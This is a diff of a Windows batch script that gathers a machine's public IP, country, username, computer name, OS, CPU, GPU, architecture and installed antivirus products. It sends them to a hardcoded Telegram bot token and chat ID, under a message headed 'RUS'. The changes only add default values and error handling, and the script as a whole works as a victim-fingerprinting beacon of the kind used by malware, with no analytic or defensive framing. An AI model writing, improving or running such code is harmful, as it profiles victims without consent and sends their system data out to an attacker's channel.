@@ -3,46 +3,40 @@ setlocal EnableDelayedExpansion
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $json = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($json.query + '|' + $json.country) } catch { Write-Host 'Unknown|Unknown' }"') do (
+set "IP=Unknown"
+set "Country=Unknown"
+for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $json = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($json.query + '|' + $json.country) } catch { Write-Host 'Error|Error' }"') do (
     for /f "tokens=1,2 delims=|" %b in ("%a") do (
         set "IP=%b"
         set "Country=%c"
     )
 )
 
+set "Windows=Unknown"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_OperatingSystem).Caption } catch { Write-Host 'Unknown' }"') do set "Windows=%a"
 
+set "CPU=Unknown"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_Processor).Name } catch { Write-Host 'Unknown' }"') do set "CPU=%a"
 
+set "GPU=Unknown"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -ClassName Win32_VideoController).Caption } catch { Write-Host 'Unknown' }"') do set "GPU=%a"
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { [System.Environment]::Is64BitOperatingSystem } catch { Write-Host 'False' }"') do (
-    if %a==True (
-        set "Arch=X64"
-    ) else (
-        set "Arch=X86"
-    )
-)
+set "Arch=Unknown"
+for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { if ([System.Environment]::Is64BitOperatingSystem) { Write-Host 'X64' } else { Write-Host 'X86' } } catch { Write-Host 'Unknown' }"') do set "Arch=%a"
 
 set "Antivirus=No Antivirus"
 for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName } catch { Write-Host 'No Antivirus' }"') do (
-    if "%Antivirus%"=="No Antivirus" (
+    if "!Antivirus!"=="No Antivirus" (
         set "Antivirus=%a"
     ) else (
-        set "Antivirus=%Antivirus%, %a"
+        set "Antivirus=!Antivirus!, %a"
     )
 )
-
-if not defined IP set "IP=Unknown"
-if not defined Country set "Country=Unknown"
-if not defined Windows set "Windows=Unknown"
-if not defined CPU set "CPU=Unknown"
-if not defined GPU set "GPU=Unknown"
 
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 
 powershell -NoProfile -Command ^
   "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
-  "Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
+  "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
 endlocal
